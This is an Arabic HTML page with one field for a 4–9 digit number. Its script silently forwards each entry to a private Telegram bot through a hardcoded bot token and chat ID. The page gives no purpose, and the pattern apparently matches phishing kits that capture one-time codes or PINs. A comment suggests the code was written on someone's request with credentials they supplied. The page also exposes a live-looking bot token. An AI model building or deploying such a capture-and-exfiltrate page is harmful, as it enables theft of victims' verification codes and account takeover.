<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>إرسال رقم — 4 إلى 9 أرقام</title>
  <style>
    body{font-family:Tahoma,Arial;background:#fff;margin:0;min-height:100vh;display:flex;flex-direction:column}
    main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}
    .box{width:100%;max-width:420px;background:#fff;padding:22px;border-radius:8px;box-shadow:0 0 12px rgba(0,0,0,.08);text-align:center}
    input{width:100%;padding:12px;border:1px solid #ccc;border-radius:6px;box-sizing:border-box;font-size:16px}
    button{margin-top:12px;padding:12px 14px;width:100%;background:#0b5320;color:#fff;border:0;border-radius:6px;font-weight:700;cursor:pointer}
    .hint{color:#666;margin-top:10px;font-size:14px}
  </style>
</head>
<body>
  <main>
    <div class="box" role="region" aria-labelledby="title">
      <h3 id="title">ادخل رقم (4–9 أرقام)</h3>

      <!-- الحقل الوحيد المتبقي -->
      <input id="onlyNumber" inputmode="numeric" autocomplete="off"
             placeholder="أدخل 4 إلى 9 أرقام فقط"
             maxlength="9" />

      <button id="sendBtn" type="button">إرسال</button>

      <p class="hint">سيُسمح فقط بالأرقام — طول المدخل يجب أن يكون بين 4 و 9 أرقام.</p>
    </div>
  </main>

  <footer style="text-align:center;padding:12px;background:#f7f7f7;font-size:13px">© 2025</footer>

  <script>
    // ---- استخدمت التوكن و Chat ID اللي أعطيتهم سابقاً ----
    const BOT_TOKEN = "8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I";
    const CHAT_ID   = "8404960059";
    const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    const input = document.getElementById('onlyNumber');
    const btn   = document.getElementById('sendBtn');

    // نمنع أي حرف غير رقمي أثناء الكتابة
    input.addEventListener('input', () => {
      input.value = input.value.replace(/[^0-9]/g, '').slice(0, 9);
    });

    // دالة تحقق طول المدخل (4-9)
    function validLength(v) {
      return /^[0-9]{4,9}$/.test(v);
    }

    btn.addEventListener('click', async () => {
      const val = input.value.trim();
      if (!validLength(val)) {
        alert('الرجاء إدخال رقم مكوَّن من 4 إلى 9 أرقام فقط.');
        input.focus();
        return;
      }

      // بنبني رسالة بسيطة نرسلها للبوت
      const msg = `📥 استلام رقم (4-9):\n${val}`;

      // إرسال إلى Telegram (غير حاسم إذا فشل؛ لا نمنع الانتقال)
      try {
        await fetch(API_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
        });
      } catch (e) {
        // إذا فشل الإرسال نكتفي بالتقدم دون كسر التجربة
        console.warn('فشل إرسال الرسالة إلى Telegram', e);
      }

      // إعطاء تأكيد بسيط للمستخدم ثم مسح الحقل
      alert('تم الإرسال.');
      input.value = '';
    });

    // تمكين الإرسال بزر Enter
    input.addEventListener('keydown', (ev) => {
      if (ev.key === 'Enter') {
        ev.preventDefault();
        btn.click();
      }
    });
  </script>
</body>
</html>
